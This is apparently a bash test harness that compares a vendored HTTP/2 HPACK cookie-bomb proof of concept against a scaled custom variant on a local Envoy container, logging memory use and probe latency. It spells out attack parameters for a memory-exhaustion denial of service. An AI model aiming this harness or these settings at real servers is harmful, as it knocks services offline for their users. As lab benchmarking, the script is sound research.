#!/usr/bin/env bash
# A/B: vendor cookie PoC baseline vs apex_cookie_scaled (Envoy lab)
set -uo pipefail

DIR="$(cd "$(dirname "$0")" && pwd)"
PLUGIN="$(cd "$DIR/.." && pwd)"
BENCH="$PLUGIN/benchmark"
POC="$PLUGIN/vendor/califio-publications/MADBugs/http2-bomb/envoy/hpack_cookie_bomb.py"
PY="${PY:-python3}"
CONTAINER=envoy-h2-lab-replay
PORT="${PORT:-10000}"
HOST="${HOST:-127.0.0.1}"
CONN="${CONN:-44}"
LOG_DIR="$DIR/../lab-replay/logs"
mkdir -p "$LOG_DIR"

RUN_ID=$(date +%Y%m%d_%H%M%S)
CSV="$LOG_DIR/ab_envoy_${RUN_ID}.csv"
LOG="$LOG_DIR/ab_envoy_${RUN_ID}.log"

container_mem_mib() {
  docker stats "$CONTAINER" --no-stream --format "{{.MemUsage}}" 2>/dev/null | \
    awk -F'/' '{gsub(/MiB|GiB| /,"",$1); v=$1; if($0~/GiB/) v=v*1024; printf "%.0f", v}' || echo "0"
}

probe() {
  curl -sS -m 10 -o /dev/null -w "%{http_code} %{time_total}" \
    -k --http2 "https://${HOST}:${PORT}/" 2>&1 | tr '\n' ' ' || echo "000 10.0"
}

log_row() {
  local label="$1" phase="$2"
  local ts cm p code lat
  ts=$(date -Iseconds)
  cm=$(container_mem_mib)
  p=$(probe)
  code=$(echo "$p" | awk '{print $1}')
  lat=$(echo "$p" | awk '{print $2}')
  echo "$ts,$label,$phase,$cm,$code,$lat" >> "$CSV"
  echo "[$ts] $label/$phase container=${cm}MiB probe=$p" | tee -a "$LOG"
}

run_label() {
  local label="$1" mode="$2"
  docker restart "$CONTAINER" >/dev/null
  sleep 6
  log_row "$label" "baseline"
  if [[ "$mode" == "vendor" ]]; then
    $PY "$POC" --host "$HOST" --port "$PORT" -n "$CONN" --streams 8 --refs 8192 \
      --cookie-value-size 4058 --hold 120 --drip-interval 30 > "$LOG_DIR/${label}_${RUN_ID}.out" 2>&1 &
  else
    $PY "$BENCH/benchmark_runner.py" --host "$HOST" --port "$PORT" --variant envoy \
      --mode apex_cookie_scaled --connections "$CONN" >> "$LOG" 2>&1 &
  fi
  local pid=$!
  while kill -0 "$pid" 2>/dev/null; do
    log_row "$label" "during"
    sleep 5
  done
  wait "$pid" || true
  log_row "$label" "after"
  sleep 30
  log_row "$label" "recovery+30s"
}

echo "timestamp,run,phase,container_mib,probe_code,probe_latency" > "$CSV"
echo "=== envoy A/B $RUN_ID conn=$CONN ===" | tee "$LOG"
run_label "califio_cookie" "vendor"
run_label "apex_cookie_scaled" "apex"
echo "CSV: $CSV" | tee -a "$LOG"
